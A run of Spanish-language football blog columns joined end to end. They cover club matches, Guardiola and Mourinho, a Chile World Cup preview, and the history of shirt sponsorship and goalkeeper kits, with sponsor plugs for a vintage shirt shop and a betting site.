la que es máximo goleador histórico, el futbolista que en el cenit de su carrera decidió asumir con valentía y honradez el gran reto que le planteaba el Barça. Por muy alejado de los focos que decidiera retirarse.Puedes encontrar camisetas de Thierry Henry en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Ocurre a veces que el fútbol de más alto nivel se vuelve de repente ridículo. Que es escenario de maniobras y anécdotas impropias de un deporte tan profesionalizado, tan minuciosamente organizado y escrutado, tan sujeto a mil y un controles. Son cosas que gustan al gran público. Detalles que humanizan a los dioses, que los hacen parecer más cercanos, más parecidos a nosotros. Como si de repente dejasen de disputar sus partidos sobre verdes alfombras y bajo la mirada de cincuenta mil espectadores para hacerlo en ese irregular descampado en el que todos nos hemos abierto la rodilla alguna que otra vez mientras perseguíamos un balón pelado por el uso.El combinado nacional de Irán, dirigido por Carlos Queiroz, consiguió la clasificación para el Mundial de Brasil tras imponerse con cierta soltura en su grupo clasificatorio asiático. Superó incluso, contra pronóstico, a la potente selección de Corea del Sur, a la que llegó incluso a vencer en Ulsan por cero goles a uno. Atravesaba lo que podría denominarse como un momento dulce, pese a no contar con grandes estrellas en sus filas más allá de los Nekounam, Masoud o Dejagah, quizá sus tres futbolistas más conocidos. Sin embargo, el buen momento deportivo de la selección Melli choca frontalmente con la situación económica del país. Las sanciones económicas impuestas al gobierno de Teherán como consecuencia de su programa nuclear han afectado muy seriamente al combinado nacional de fútbol. Tanto es así, y según se desprende de las palabras del propio presidente de la federación de fútbol del país, Ali Kaffashian, que los internacionales persas acudirán a Brasil prácticamente con lo puesto. Tal es la sensación de precariedad. ‘No vamos a dar a cada futbolista una camiseta para cada partido. Los jugadores deben mirar por la economía del equipo y del país‘. O sea, que de eso de ir corriendo a cambiarle la camiseta a Messi, Agüero o Higuaín al terminar el partido que les medirá a Argentina el próximo día 21, mejor nos vamos olvidando. Y uno se sorprende de que una selección nacional, con sus futbolistas profesionales, su entrenador de primer nivel y su brillante clasificación mundialista como tarjeta de presentación, tenga que verse sujeta a esta férrea disciplina económica más propia de un torneo aficionado de interpueblos que de la histórica cita brasileña. Como si mil euros arriba o abajo fuesen a desequilibrar su balanza. Que uno se los imagina preparando el campeonato en el primer descampado que encontraron al llegar a Brasil y con las mochilas y las chaquetas haciendo de porterías. Y todo por culpa de esa ancestral costumbre iraní de jugar al Quimicefa con uranio.Pandev lo tuvo todo para marcar y falló. Totti se fue lesionado y la Roma parecía hundirse en el césped de su propio estadio. La salida de Paolo Cannavaro, por lesión de Britos, descentró a la saga napolitana. Pjanic marcó de falta y el partido se decantó, finalmente, por los romanos. Ni la salida de un renqueante Higuaín ni el arreón en la segunda mitad pudieron cambiar el marcador. Luego Paolo fue expulsado y ahí acabó el partido. La Roma sigue imparable y al Nápoles le asaltan las dudas.Corazón ingrato. Maradona, histriónicamente enfadado, le dijo a la prensa tras el partido que el Nápoles no había perdido, que simplemente no había comparecido. Por ahí van los tiros. El equipo de Benítez tiene plantilla y talento para luchar por el campeonato, pero es en estos partidos donde la familia tiene que estar unida. Es aquí donde se gana. Son estos puntos los que darán la Liga. No sé si la aventura europea está afectando, o la superioridad de la Roma inmoviliza de tal manera, pero los de azul tuvieron oportunidades para dar un golpe en la mesa de la Roma y no lo hicieron.Escucho de nuevo `Core ´ngrato´ mientras escribo estas líneas. El fin de semana me vino bien. Comer y beber con los míos ahuyenta los fantasmas del paro, del desamor y esta tristeza pegajosa que es vivir en tiempos difíciles, como estos. No hay nada como la familia para volver a sentirse importante, volver a sentirte querido y vivo. Sólo espero que el Nápoles no se desuna, que siga fuerte y confiado. Este puede ser un buen año. Ojalá el año no acabe como la melodía nostálgica de lo que pudo ser y no fue, como una vieja canción napolitana. En el fútbol los soberbios caen mal. Tiene su lógica: no nos gustan las personas que se jactan de su superioridad, que alardean o se confían infravalorando al rival, esos que miran desde arriba con cierta condescendencia. Cuando salen al campo queremos que sean destrozados por el contrario, que un pequeño les baje los humos, esos alivios primarios del aficionado rebelde, de esa parroquia que disfruta con el dolor de los ricos y la alegría de los pobres. Aunque secretamente pensemos que un equipo es mejor que otro, nos chirría escucharlo públicamente. De repente a todos nos asalta una congoja futbolística de lo más extraña, sentimos piedad y hasta respeto por el adversario, y pensamos que es de mal gusto dejar a las claras donde juega cada uno. Llamemos a esa espontánea angustia “corrección política”, esto es, creer que es malo confesar algo por si puede herir sensibilidades. Concluimos que, como hay tantas sensibilidades como personas, la tendencia final será evitar decir cualquier cosa que se aleje de unos parámetros delimitados, precisos y templados. Una mezcla entre la politeness inglesa y la mojigatería española. Por ejemplo, a nadie en su sano juicio se le ocurre pensar que el Copenhague es mejor equipo que el Barcelona. Unos porfían en ligas menores y otros son campeones de Europa, unos tienen a Santin y otros a Messi, por decir algo.Cuando vimos los emparejamientos del Barça en el sorteo todos soltamos un arrebatador “¡qué suerte!” que después matizamos acuciados por esa fatiga que os mencionaba. Empezamos a darle vueltas a que si todos los rivales son difíciles, que era un grupo trampa y hasta terminamos hablando del frío en los viajes y el auge imparable del fútbol del este. La cosa es que por más que mirara ni el Rubin Kazan, ni el Panathinaikos ni el Copenhague me parecieron clubes fieros, sólo buenos conjuntos a los que un equipo sobresaliente como el Barcelona no debería temer bajo ningún concepto.Yo entiendo a los supersticiosos, que no dicen las cosas para que no pasen, pero jamás entenderé a los falsos humildes. Personas que saben muy bien el espacio que ocupa cada uno, que son conscientes de lo que hay, pero que envuelven la realidad en un vistoso papel de regalo. Guardiola es tan buen entrenador como lisonjero con los rivales. Si pensamos en la motivación, es infantil creer que sus futbolistas se van a activar por decir que el Copenhague es un magnífico equipo. Tampoco creo que los daneses sean tan melosos como para confiarse porque Guardiola les dore un poco la píldora. Todo lo contrario, según pienso, a alguno hasta le sentarán mal tantos arrumacos por parte del entrenador rival. ¿Cómo analizar entonces las palabras de Guardiola? Esas que dicen que el Copenhague tendría mucho que decir si jugara nuestra competición. O aquellas del Rubin Kazan, que parecía que estuviera glosando al Milan de Sacchi. Yo creo que Pep, que es un tipo muy inteligente como ha demostrado antes y después de enfundarse el chándal de entrenador, es un poco soberbio. Que sabe a qué juega, conoce milímetro a milímetro el club que dirige, y cree de mal gusto hacer públicas sus firmes y devastadoras conclusiones futbolísticas. Que se deja llevar por esa corrección tibia, aburrida y algo estomagante para no caer en esos ejercicios de soberbia que tanto daño hacen a entrenadores más lenguaraces como Mourinho. Que es prudente pero también un tahúr que esconde sus cartas por decisión personal, por cultura del club o por simple juego con los medios.Desde que llegó Pep ha sido un ejemplo forzado de educación. Digo forzado porque parece que paladea e imposta cada palabra. Que lo que bulle por su sangre no es lo que, con una sonrisa amable, suelta en las ruedas de prensa. Negadas como tiene las entrevistas, difícil vislumbrar un entrenador más accesible, más sincero si me permitís la palabra, con algo más de chicha que ese robotizado y respetuoso entrenador que tiene cera para todos los rivales, ya sean de Segunda B, daneses, griegos o malagueños. Y diréis que es mejor así, y es posible que tengáis razón. Si escribo esto es porque creo que sus declaraciones sobre el partido del Barça de esta noche han sido excesivas, ampulosas, casi de hipérbole macarra. Como esos amigos fanfarrones que nos cuentan unas cálidas vacaciones como una sucesión de aventuras al límite del peligro. Ni soberbio ni tan falsamente humilde.Sea cual sea, siempre es hermoso que un estadio aplauda a un rival, siempre hay deportividad de fondo.Yaya Toure. En ocasiones, y muy especialmente cuando las cosas va mal y amenaza tormenta, se alza una figura como la Pizarro en Perú, traza una raya y suelta “Por aquí se va a la fama”. En un City entre caricaturesco y deprimente, apareció el Terminator negro que esconde a un Nijinski del balón y al menos tres corazones, y levantó la bandera alrededor de la cual se acabaron organizando sus titubeantes compañeros. Toure defendió cuando hubo que hacerlo, guardó el balón en el momento necesario, y cabalgó varias veces a cámara lenta, como sólo él sabe hacerlo, desparramando muñecos blancos el camino. En la última de ellas Dzeko cantó su bingo.El trivote. El Bernabéu vio también anoche el debut de Essien en una suerte de trivote que evoca las tácticas tortuguiles comentadas estos días en otros lugares. Un poco menos dinámico de lo habitual, el ghanés se ofreció, tocó y tocó cuando fue necesario y colaboró, por supuesto, en esas tareas defensivas en las que antes fue el rey. No es descabellado pensar que, si le respeta el físico, el futbolista africano se convierta poco a poco en asiduo del once titular madridista. Partiendo un poco más de atrás y sin gran presión que superar, Alonso dirigió al equipo con su maestría habitual, y Khedira, liberado arriba, combinó la energí a marca de la casa con una cantidad excesiva de pérdidas de balón. En conjunto el experimento, que pretendía evitar caos como el de Sevilla, puede considerarse medianamente exitoso, por cuanto aseguró cierta superioridad del Madrid y anuló el ataque citizen, al menos hasta mediado el segundo tiempo. Habrá que ver si tiene continuidad. Las razones de Mourinho. Salió el portugués a la sala de prensa del Bernabéu como si sus rodillazos en la banda le hubieran metido speed en la venas. Largó y largó como en él es costumbre, vehemente y asertivo, torrencial. De lo mucho que dijo, no puede discutirse la lista de motivos por la cual la prensa le hubiera crucificado hoy si el balón final de Cristiano se hubiese quedado, como ordenaba el canon, en la manopla de Hart; tampoco que este –el del final, precisemos- es el tipo de fútbol que le gusta a él y al Bernabéu; o en fin, que realmente su equipo tiene capacidad para enfrentarse a los mayores retos, y que esa capacidad no se había visto en los partidos anteriores. Difícil discutir todo esto.Las sinrazones de Mourinho. Dice el refrán que quien mucho habla mucho yerra, y ni siquiera the Special One es capaz de vivir en los márgenes de la sabiduría popular. Por ejemplo, su argumentación sobre Ramos no se la cree ni Karanka; puede haber millones de motivos por los que no jugó ayer el central sevillano, pero nadie, absolutamente nadie, va a creerse que a día de ayer era mejor para el Madrid que su puesto lo ocupase un joven de 19 años que no había debutado aún en Liga. Hay agujas por las que no hay camello que entre. Y además, el entrenador del Madrid debería distinguir entre periodistas amigos y enemigos, y no meter a toda la Prensa en el mismo saco; su agresividad indiscriminada, además de apoyarse en la falsedad –no todos los periodistas están contra él, sino algunos medios y personas bien identificados- le granjea enemigos de modo innecesario. Y los medios siempre van a estar ahí, gane o pierda.Mancini. Resuenan por ciertos locales de Madrid conversaciones interminables de servidor con Sergio Cortina. Citizen de buena cuna, mi compañero y sin embargo amigo defiende lo construido por los otros de Manchester en estos años, un viaje paso a paso hacia la élite donde Mancini, justo es decirlo, ha desempeñado su papel. Sin embargo, el partido de ayer ofrece munición a los que pensamos que dicho viaje hubiera resultado más fulgurante, más emotivo y, sobre todo, más rápido con un entrenador que pudiera sacar más provecho de la interesante plantilla de que dispone. Ningún equipo de los que ha enfrentado el Madrid esta temporada mostró una actitud tan timorata, un esquema de juego tan plano y una pobreza de recursos tan grande como el campeón inglés anoche en el Bernabéu. Este equipo debería estar ya, tras tantos años, para pelear la orejona, y a día de hoy es el tercer candidato para pasar la fase de grupos. Algo pasa en el banquillo, y algo muy  grave. ¿Redención? El partido de ayer dejó el aroma de los momentos que no se olvidan, con los tres ingredientes que ponen boca abajo el recinto de la Castellana: actitud sedienta de sangre del Madrid, cargas de caballería y remontada con culminación sobre el reloj. El recinto guarda centenares de estos recuerdos, que saben cómo dibujarse únicos en la memoria. La duda será comprobar si esta plantilla saciada de Liga, sin los focos de glamour de la Champions y que a día de hoy ve al Barcelona con catalejo, será capaz de volver a bajar al barro para engancharse a un torneo de regularidad que ya, en la cuarta jornada, exige la hombrada. Los precedentes de principios de siglo, en circunstancias similares, no son halagüeños para el Madrid.Gracias a bwin, por permitirnos asistir en directo al partido. Resulta un poco paradójico que al equipo que actualmente ocupa el segundo puesto de la Liga se le pueda aplicar el epíteto de perseguidor, mientras que a su sucesor se le califique de perseguido. Sin embargo, nadie puede negar que esta es la situación en la que se encuentran Barça y Valencia, que se enfrentan mañana en el Camp Nou (21:30 horas, Canal Plus) reeditando el choque de hace pocas fechas en Mestalla. La demencial fractura de la competición entre los dos monstruos y los demás tiene la culpa, en un torneo donde el segundo es más perdedor que nunca, y el tercero logra un título oficioso que sólo celebra en los despachos y por el cual nadie se baña en una fuente. La Liga de los pobres.El partido de mañana, más allá del resultado, se va a interpretar especialmente desde el punto de vista de la actitud. En el caso del Barcelona, y por primera vez desde que Guardiola se hizo cargo del equipo, han surgido dudas respecto a si desde el banquillo se están priorizando competiciones. El argumento utilizado por Pep cuando ha sido cuestionado sobre este asunto, “hemos ganado 13 títulos de 16”, resulta perfectamente válido sobre lo que ha ocurrido en los años anteriores, pero nunca hasta ahora se habían encontrado con tal desventaja en la competición que exige trabajo continuo, y que condiciona las demás. Considerando la inteligencia del técnico de Santpedor, que sin duda conoce el daño que estos rumores pueden hacerle a su equipo, podemos esperar mañana una alineación cuajada de vacas sagradas, máxime considerando que el Barça no tiene partido entre semana, que Iniesta y Busquets necesitan partidos, y que el rival es de fuste. Además, el equipo culé necesita una actuación convincente en  Liga, tanto para retomar el buen camino después de algunos partidos muy discretos como para alejar las comparaciones con el Madrid galáctico. Sin olvidar que si una diferencia de diez puntos con el líder ya está ensuciando el ambiente, una ampliación de la misma podría acercarlo a lo irrespirable.Cada semana, y de la mano de bwin.es, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. A su vez, el partido no posee menos alicientes para un Valencia que está completando una muy buena temporada.En descargo del francés hay que decir que la apuesta, cuanto menos arriesgada teniendo en cuenta el par de centrales que gastaron ayer los gunners, funcionó y Szczesny, como pretendía Wenger, adelantó el futuro un par de años.El meta polaco, internacional ya por cierto, arrancó titubeante, quien sabe si impresionado por advertir la diferencia entre Old Trafford y Griffin Park (jugó a préstamo en el Brentford la temporada pasada). Un pase fofo a Squillaci. Dudas. Los pies como flanes. Pero tras unas cuantas paradas de rutina supo calentarse, vencer al susto y rematar el partido con dos acciones plenas de finura para repeler sendos esfuerzos de Anderson y un primera espada como Wayne Rooney. Tuvo mucho mérito lo de Szczesny, especialmente porque mostrar la firmeza adecuada cuando el equipo desnudó su defensa ante la contra eléctrica del Manchester United. Seguramente más de un parroquiano del Emirates, uno de esos señores irritados constantemente contra el mundo mientras devoran con avidez  puros como estacas sonrieron anoche frente al televisor y pensaron que al menos tienen portero. También Humbert Humbert, claro. ¿Y el Arsenal en sí? Digamos que se empeñó en darle la razón a Alex Ferguson y a Patrice Evra. El escocés, perro viejo, jugó al cortejo con el Arsenal en la previa afirmando que los Arshavin, Nasri y compañía eran tan duros, tan físicos, ahora como en tiempos de Martin Keown. Como cuando el whisky alimentaba el motor. No sé si cayeron prendados pero el caso es que el equipo se desnaturalizó y olvidó el balón, su arma, acumulando además un rosario de tarjetas en las figuras de Chamakh, Andrey Arshavin, Gaël Clichy y Alex Song. Lo mismo con Patrice Evra. El menudo lateral, cuya ojeriza por el Arsenal aumenta cada temporada y revisen la hemeroteca si no me creen, calentó el choque calificando con desdén al club gunner de mera academia de lo estético, de kindergarten balompédico con nula capacidad para engordar la vitrina. Lo dijo Evra pero, no nos engañemos, muchos hinchas del Arsenal llevan años comulgando con el lateral francés y partidos como el de ayer, pasó otro tren, les dan la razón. Corría el año 1962 y cuando el bombo que habría de decidir los primeros enfrentamientos del Mundial dejó de girar y escupió las bolitas, a Chile, anfitriona de aquel Mundial, se le torció el gesto. Los chilenos deberían luchar contra alemanes, italianos y suizos por un lugar en la siguiente fase. Contra una maría, sí, pero también contra dos campeonas del Mundo. La cosa pintaba como el betún para la Roja del Tata Riera. Sin embargo, para cuando llegó lo bueno, que relataré antes de que finiquite éste párrafo, los locales habían goleado a Suiza en un arranque de campeonato cuanto menos esperanzador. Y entonces se presentó Italia. El mísero empate a cero goles cosechado ante Alemania Federal obligaba a la azzurra a apretar los dientes contra la anfitriona para conservar la vida en el campeonato. No sabían, sin embargo, que en Chile se les esperaba con los brazos abiertos. Pero no para el achuchón, ¿se entiende? Arrancó el partido en Santiago y al minuto 12 ya tuvo que ser interrumpido. Giorgio Ferrini se empleó violentamente contra un chileno y el árbitro ordenó su expulsión. También ordenó a varios policías la evacuación del agresor, que se aferraba al rectángulo como a los tobillos del adversario. Más tarde Mario David (italiano) y Leonel Sánchez (chileno e hijo de boxeador para más señas) se midieron lomo y cara en repetidas ocasiones. Tal desastre, o partido titúlenlo como gusten, pasó a la historia como “La batalla  de Santiago“. Saco a colación ésta pequeña y lúgubre anécdota en la centenaria vida de la selección chilena por pintar una imagen antitética de la selección actual. Con el pasaporte mundialista en el bolsillo tras una más que meritoria campaña de clasificación en el exigente grupo suramericano (segundos, tan sólo por detrás de la inalcanzable Brasil) el juego chileno ha transmitido las mejores vibraciones en la previa mundialista. Y el artífice del milagro, tal puede considerarse para un equipo que en rara ocasión se pasea por las citas mundialistas, es Marcelo Bielsa. Aun diría más, Chile es Bielsa. Y punto.Es cierto que la expedición cuenta con jugadores de cierta categoría en Europa como el errante Mark González o el intermitente Matías Fernández. Incluso a un fenómeno como el Chupete Suazo. Sin embargo, la sensación general es que Chile no hubiera conseguido llegar al Mundial si el banco lo hubiese ocupado  otro entrenador. Bielsa, quizá uno de los mayores tácticos del panorama actual, ha potenciado las virtudes de un conjunto humilde. Y ahora tiene un equipo.Bielsa, y aquí viene el palo, es uno de esos pocos entrenadores (El protegido de Santpedor es paradigma) que conseguiría engrasar una rotativa sólo con la saliva que segregan los plumillas al verlo pasar. El no tiene la culpa de ser guapo y de buena familia. Tampoco de lustrar la vitrina con aperturas conseguidos al mando de equipos ciertamente menores y un oro olímpico, dirá el otro. Sin embargo, al resto nos queda la duda de si es la enésima exageración argenta o realmente sirve para sacar adelante un equipo en las citas mayores. Si podrá revivir mejores tiempos. Los analistas europeos lo adoran más que a su parabólica por inculcar un estilo valiente al once chileno, 3-4-3 en la mayor parte de las ocasiones, y rejuvenecer la convocatoria basándose en las exitosas inferiores. Yo, no puede ser de otro modo, le alabo el gusto pero creo que Chile no es la selección adecuada para demostrar algo en Sudáfrica.No se me malentienda. Creo que es un buen conjunto, ordenado en torno a la pelota y que puede dañar arriba si el Chupete llega en forma. En Bravo hay un buen portero con experiencia en Europa. La defensa es contundente (Medel, Ponce y Jara son ejemplo de ello) y puede sacar la pelota con pulcritud ante conjuntos de nivel medio. Para la medular tienen en Matías Fernández al clásico futbolísta sudamericano que ofrece su mejor cara, últimamente la única, cuando viste los colores nacionales; en Mark González, Beausejour y Valdivia la pericia necesaria y en Millar y Carmona las dosis requeridas de equilibrio. En ataque, uno de los tres puntas, el Chupete Suazo, será el termómetro de la Roja. Si está bien, el país entero reza por su recuperación física, es letal. En conjunto, Chile sufre cuando no logra tapar huecos pero una buena transición y el fútbol rápido que puede desplegar de medio campo hacia arriba la hacen un conjunto peligroso.Ilusiona a los suyos Bielsa pero el rendimiento en el próximo Mundial es una verdadera incógnita. Descartando su excelente previa como vara de medir, el nivel es inferior al de un Mundial, la Roja está en la misma encrucijada que otras selecciones de su entorno. Pienso en Uruguay. Para saber realmente la medida de ambas habrá que  verlas desenvolverse en un torneo grande. Imaginó que cuando el bombo escupió las bolitas a Chile se le heló la sangre. La mala suerte de caer en el grupo H (junto a España, la pujante Suiza y la despreciada pero cargada de veneno, al tiempo, Honduras) y la peor fortuna del hipotético cruce (una canarinha a la que fueron incapaces de vencer en los dos partidos de clasificación) dejan el objetivo de Chile en pasar a segunda ronda y volverse a casa con el orgullo de haber realizado un buen juego.Lo mejor: el estilo alegre, marca de la casa Bielsa. Chile es peligrosa a la contra con los pases de Fernández y el desmarque y puntería de Suazo. Tiene extremos para interpretar a las mil maravillas una transición rápida.Lo peor: cara opuesta de la misma moneda, Chile sufre defendiendo con espacios. La defensa es expeditiva en el cuerpo a cuerpo pero tiene verdaderos problemas en los repliegues.Jugador(es) a seguir: Matías Fernández debe explotar como el gran jugador que apuntaba ser en Colo Colo. Quiero ver a Gary Medel atrás y a Jorge Valdivia regateando como sabe.Pronóstico DDF: Pelear el segundo puesto con SuizaLos 23 mundialistas:Porteros:Defensas:Centrocampistas:Delanteros: Cada quince días y de la mano de Classic Football Shirts: la tienda online especializada en camisetas antiguas, nos acercamos al fútbol con una perspectiva diferente. Lo hacemos desde las camisetas con las que se ha construido la historia del deporte rey.Borja Barba abría este guardarropa de fetiches hace unas cuantas semanas para explicar una verdad como un templo, a la futbolerada nos pone horrores lo de la serigrafía comercial en la camiseta. No es lo mismo una Adidas rojinegra así en liso que atravesada en fieltro con el nombre de la aseguradora que tenían a pachas Berlusconi y Ennio Doris. Y por mucho lamento purista que tronara Castellana abajo en su día, hay que reconocer que un Zanussi en el pecho arropando el salto de Carlos Santillana hinca de rodillas al más impío. A mi por lo menos me ha reavivado unas cuantas conversaciones e imagino que a los parroquianos de Anfield les ocurre tres cuartos de lo mismo con su elástica roja del 79. Y es verdad que enfundados en aquella Kenny Dalglish, Alan Hansen o Graemme Sounnes se paseaban por Inglaterra y Europa pero no lo es menos que la camiseta tiene miga más allá de los laureles. Con ella el Liverpool se convirtió en el primer club profesional inglés, los japoneses tuvieron la culpa, que lució publicidad en su zamarra.Como digo la del Liverpool fue la primera camiseta de un club profesional en servir como un trocito más de valla. Como un recuadro llamativo en el tabloide, como un spot pegadizo de radio. ¿Porqué incido tanto en la variable de la profesionalidad? Como pueden adivinar porque el Liverpool no fue el primer club inglés en advertir cuan beneficioso era para las arcas apañar un espacio de su imagen para un tercero. El honor corresponde al infrafutbolero ad nauseam Kettering Town que en liga amateur ya había lucido el emblema de una fábrica de neumáticos local, la Kettering Tyres, tres años antes. Lo curioso del caso y lo hago figurar aquí para solaz de los amantes de la golfada es que la FA prohibió el asunto de lucir logotipo a los cuatro días de ponerse en marcha y el Kettering saltó al campo luciendo un anuncio al que se le habían arrancado tres letras finales hasta formar un chapucero Kettering T que el presidente del club quiso hacer pasar ante la ley por el nombre del club. Lógicamente la andanada, españolísima por otra parte, se coronó con multazo.Otros que se adelantaron al Liverpool fueron los escoceses del Hibernian que para la 77-78 ya mostraban en la pechera una enseña mítica que rezaba Bukta, primer fabricante de ropa deportiva en la historia de inglaterra, objetivo señero de los que rastreamos Ebay con esmero  y proveedor del conjunto verdiblanco en aquel momento. Más tarde, en 1981, llegaron Jimmy Hill y el Coventry para (agarraditos de la mano con Talbot) parir uno de los más legendarios fetiches del fútbol inglés, un trocito de tela celeste alsaltada por una t que anunciaba un nuevo modo de hacer negocios en el fútbol. Pero esa es otra historia.Puedes comprar esta camiseta y cientos más en Classic Football Shirts. Cuando uno ya comenzaba a acostumbrarse a la caterva de oportunistas, Diego Armando Maradona al frente, que culpan al Jabulani de sus propias equivocaciones llega otra explicación. Tengo una coartada señor detective y no me lleve al calabozo del Mundial por despacharme como me estoy despachando.Corrección sí, pero no pagada al precio de parecer un santurrón.Pueden pasar dos cosas hoy. Si el Barça golea, gana fácil, se planta sobre el campo como suele hacer desde que Guardiola es entrenador, me daréis la razón en parte. Algo habrá exagerado Pep, algo olerá a trampantojo, a tufillo soberbio que se solapa con buenas palabras. Si el Copenhague coge a los blaugranas y les hunden en el césped danés, tendré que confesar que no tengo ni idea de fútbol y que Guardiola no es sólo un enorme entrenador sino un magnífico analista balompédico, y que su predicción era tan disparatada a priori como verídica tras el partido. En todo caso, seguiré desconfiando de esa elegante puesta en escena que para mí esconde un entrenador inflexible, realista y autoconsciente y seguiré atento a ver si algún exabrupto inesperado me quita de la cabeza la idea de que Guardiola es un autómata con modales blandos. Cada quince días y de la mano de Classic Football Shirts: la tienda online especializada en camisetas antiguas, nos acercamos al fútbol con una perspectiva diferente. Lo hacemos desde las camisetas con las que se ha construido la historia del deporte rey.Veintidós jugadores en el campo pero tú siempre solo. Debajo de los palos, encuadrado en una fotografía sin brillo. Si las cosas van bien serás un espectador de lujo. Si tienes mucho trabajo es que tu equipo no funciona. Eres lo que queda cuando al resto ya no le queda nada.Siempre a medio camino entre el milagro y la vergüenza. Marcado desde niño por un mal bote, por el balón que se desliza entre las piernas hasta la red, por la salida en falso, por las manoplas blandas. Encajar un gol duele, pero a nadie como a un portero. Cada gol es un allanamiento de morada, una visita desagradable en su espacio doméstico. Y por si fuera poco, como si los porteros no tuvieran suficiente con los tiros con efecto, las faltas directas, los resbalones, los cabezazos a bocajarro, las cesiones y las salidas en la que el delantero deja la bota; los modistos deportivos se dedican a inventar camisetas imposibles. Disfraces. Escarnios noventeros que acabaron por hundir la carrera de Seaman o, para su desgracia, nos hicieron fijarnos demasiado en aquel portero impredecible llamado Jorge Campos.Viendo las camisetas del especial de porteros de Classic Shirt me horroriza el desprecio por el buen gusto de algunas marcas. Pero como en un cuadro de Pollock, cuanto más miro, más me engancha el atentado policromado y geométrico. Recuerdo a Schmeichel vestido por hummel en el arco danés, a Pagliuca echando por tierra años de elegancia italiana, a James venciendo a las musas y a sus propios fantasmas con esta puñalada de Adidas, o a Seaman moviendo el bigote como un ratón, pensando que algo olía mal en este diseño de la no siempre vilipendiada lo suficiente Nike. Si ya es difícil mantener el aplomo en el campo, si es difícil ordenar a la defensa, culpar a la zaga, corregir posiciones y garantizar el liderazgo entre una banda de bobos millonarios, qué dificultad tendrá hacerlo con esas elásticas lisérgicas. Sin embargo, estos extraños estampados dan personalidad a quien los porta. Dicen que para ser portero hay que estar un poco loco, y a lo mejor es verdad. El mexicano Campos diseñaba sus propias camisetas, su retorcida mente estaba un paso por delante de Dalí y un paso por detrás de Mondrian. A todas luces un genio, un pionero en esto de disfrazarse de algo bizarro para salir al campo. De marcar diferencias para no pasar desapercibido en un deporte que aplaude a los delanteros y murmulla cuando interviene el cancerbero.Afortunadamente, hay porteros sobrios, aunque parezca un oxímoron. Podemos recordar la elegancia de Buffon, la de Barthez, la del no suficientemente aplaudido Walter Zenga, o la habitual moderación de Víctor Valdes. Casi todos ellos herederos del primigenio estilo de los porteros, el negro crudo de Yashin o como mucho el verde inglés de Grobbelaar o el rompedor pero austero amarillo del gran Gordon Banks. Si hay un portero que, salvo pequeños deslices, ha vestido con arreglo a su condición, ese ha sido un ídolo de infancia. Oliver Kahn consiguió transmitir confianza a sus compañeros gracias, en parte, a estas camisetas de aplomo y seguridad. Nada de faralaes ochenteros, nada de caer en la tumba donde cayeron Given o Rossi. Lo suyo era otra cosa, muy serio, muy alemán.Muy aconsejable todo esto para ustedes, porteros que me leen, que buscan el hábito ideal para asombrar en las pachangas de fútbol 7. Que están cansados de las risas burlonas cuando el balón se pasea por entre las piernas, guardametas abandonados en los corners, que intentan frenar el anárquico arranque de los laterales, que ven los palos desnudos en las faltas laterales, que tras un paradón meritorio ven como el rebote no es luchado en la segunda jugada, arqueros que se han tragado un penalti a lo Panenka por el estúpido compañero de trabajo que tuvo talento para hacer algo más en el fútbol y que ahora paga su frustración humillándole sobre el rectángulo de hierba artificial. Para ustedes son estas camisetas, un portero no es un portero si al salir al campo no se cree su función. Elijan equipo y elijan estilo. Hortera o sobrio, colorido o monocromo, caleidoscópico o aburrido, pero profesional en todo caso. Tomaba una cerveza en la calle Feria, sentado la terraza de un bar italiano lleno de guiris, como uno más de ellos –un mapa en la mesa y la mochila amarrada a la pata de la silla-; cuando reconocí el golpe seco de la batería. Ese bombo profundo, ochentero, desprendido del timbre y de la vibración del pellejo, y a continuación la caja con el pequeño eco metálico. Un cuatro por cuatro certero y marcial, endulzado con la voz de Prince. Nunca quise causarte ninguna pena. Había escuchado la canción tantas veces, me había entristecido tanto su muerte, que esa melodía sonando sorprendentemente en mitad de una calle bulliciosa me concilió con el mundo. Apuré la cerveza y cerré los ojos dejando que el bajo, sencillo y poderoso, percutiera en mi pecho.Mire hacia atrás para saber de dónde venía la música, de qué bar o terraza. Tras de mí encontré un Seat León blanco. Su chapa reverberaba. Los altavoces exigidos. Un chico con Rayban Wayfarer y barba poblada cantaba dentro, o hacía que cantaba moviendo afectadamente la boca a la vez que el artista de Minneapolis desgranaba la melodía. La burbuja de ensoñación explotó. El hortera circulaba despacio. Sin duda quería que todas las bellas rubias de Berlín o Manchester le miraran. Que esas francesas de narices afiladas como puntas de flechas que tomaban agua con gas en la mesa de al lado, se giraran para admirarlo. Ese hijo de puta estaba utilizando la muerte de Prince, una de sus mejores canciones, para ser protagonista de esa céntrica calle sevillana. El paseíllo duró un par de minutos. Nada, comparado con los más de ocho minutos de Purple Rain. El sonido se fue perdiendo calzada arriba hasta que se apagó. Las extranjeras volvieron a lo suyo, a mirar las aceitunas como si hubieran encontrado un diamante en una mina sudafricana, a abrirse un poco las camisetas para que el sol penetrara con energía en sus cuellos níveos. En fin, cosas de guiris. Pero yo me quedé ahí, odiando la impostura de ese chico. Su sacrílego numerito.Mascando el odio, que es como el tabaco del oeste adaptado a nuestra época, llegue a casa para ver al Córdoba. Mi equipo empató a cero en el Arcángel. Todo el fin de semana haciendo cuentas, viendo a los rivales, para acabar de nuevo fuera de los playoff. Es dura la vida del aficionado de a pie. Somos los soldaditos que morían los primeros en el Risk. Los que se iban abriendo paso de continente en continente a la espera de repoblar de tanques la zona. La basura esquelética que nutre al fútbol. Mientras que golpeaba el sofá de casa ante cada ocasión fallada, mucha gente tuiteaba sobre la gesta del Leicester.Del Leicester solo sé que mi chica estudió en esa ciudad, que en el escudo sale un zorro y que viste de un azul funcionarial. En una calle oscura, no sabría distinguirlos del Getafe.La teoría la aporta Graeme Sounnes. El otrora hombre duro del fútbol británico, leyenda del Liverpool, entrenador apañado y viva imagen del pre-metrosexualismo (muchos recordamos su bigote con lágrimas en las mejilla ) reparte estopa ahora desde su puesto de comentarista televisivo en un canal de televisión irlandes. Y Souness ha querido rascar, en su último tackle, el tobillo de los responsables de la selección inglesa. A juicio de Graeme, Inglaterra dibuja los desatres que dibuja sobre el cesped sudafricano por mor de la altitud. No está de broma.A un hombre que una vez  tuvo las santas narices de desafiar a un campo repleto de turcos cabreados no le han dolido prendas, lógicamente, para buscarle las cosquillas a la Federación inglesa. Dice que Inglaterra, y por extensión entiendo que el resto de selecciones que han viajado a Sudáfrica para el paseillo, se encuentra en el punto más bajo de la curva que representa su condición física por culpa de una mala planificación médica de los entrenamientos. Graeme, y se pone a si mismo durante el mundial que disputó con Escocia en México 70 como ejemplo, sostiene que entrenar en 